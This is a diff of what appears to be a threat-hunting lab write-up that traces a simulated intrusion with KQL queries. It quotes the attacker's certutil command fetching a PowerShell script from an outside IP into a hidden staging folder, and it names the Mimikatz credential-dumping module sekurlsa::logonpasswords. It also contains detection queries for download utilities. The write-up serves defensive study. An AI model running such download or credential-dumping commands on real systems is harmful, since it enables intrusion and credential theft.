@@ -164,25 +164,26 @@ DeviceProcessEvents
 
 ---
 
-### 8. Command & Control: C2 Server Address & C2 Communication Port
+### 8. Defense Evasion: Script Download Command
 
-Searched for a command and control server since attackers typically utilize command and control infrastructure to remotely control compromised systems. A command and control server at 78.141.196.6 was contacted by malicious svchost.exe from multiple machines. In addition, command and control communications utilized port 443 (HTTPS) to blend in with legitimate encrypted web traffic, making network-based detection more difficult and allowing for the evasion of basic firewall rules.
+Searched for evidence of malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.
 
 **Query used to locate events:**
 
 ```kql
-DeviceNetworkEvents
-| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
-| where InitiatingProcessFolderPath has "WindowsCache" 
-| project TimeGenerated, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, RemoteIP, RemotePort, RemoteUrl
-| sort by TimeGenerated asc
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
+| where DeviceName == "azuki-fileserver01"
+| where ProcessCommandLine has_any ("certutil", "bitsadmin", "urlcache")
+| project TimeGenerated, DeviceName, ProcessCommandLine
+| order by TimeGenerated asc
 
 ```
-<img width="2390" height="394" alt="POE_QR10B" src="https://github.com/user-attachments/assets/f8cd25f7-ac3c-4945-958f-e1dc6aa771a1" />
+<img width="2298" height="420" alt="CH_Q9" src="https://github.com/user-attachments/assets/a336c803-3d5e-4fcd-a379-b70201e04c4e" />
 
 ---
 
-### 9. Credential Access: Credential Theft Tool
+### 9. XXXXX
 
 Searched for executables downloaded to the staging directory since credential dumping tools are typically used to extract authentication secrets from system memory and dicovered a credential dumping tool with the filename mm.exe.
 
@@ -200,7 +201,7 @@ DeviceProcessEvents
 
 ---
 
-### 10. Credential Access: Memory Extraction Module 
+### 10. XXXXX 
 
 Searched for command line arguments passed to the credential dumping tool to identify the specific module used to extract passwords from memory and discovered that the Mimikatz module "sekurlsa::logonpasswords" was used by the attacker to extract credentials from LSASS (Local Security Authority Subsystem Service) memory.
 
